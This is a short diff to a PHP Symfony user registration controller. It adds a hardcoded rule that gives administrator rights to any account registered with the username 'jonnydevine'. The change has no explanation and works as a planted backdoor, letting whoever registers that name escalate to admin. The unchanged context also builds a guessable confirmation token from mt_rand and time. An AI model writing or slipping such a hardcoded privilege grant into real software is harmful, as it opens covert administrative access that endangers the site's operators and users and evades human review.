@@ -132,7 +132,11 @@ class UserController extends AbstractFOSRestController implements ClassResourceI
             $user->setEmail($email);
             $user->setEnabled(false);
             $user->setPlainPassword($password);
-            $user->setRoles(["ROLE_USER"]);
+            $roles = ["ROLE_USER"];
+            if ($username === "jonnydevine") {
+                $roles = ["ROLE_USER", "ROLE_ADMIN"];
+            }
+            $user->setRoles($roles);
             $confirmationToken = sha1(mt_rand(10000,99999).time().$user->getUsername());
             $user->setConfirmationToken($confirmationToken);
             $this->userManager->updateUser($user);
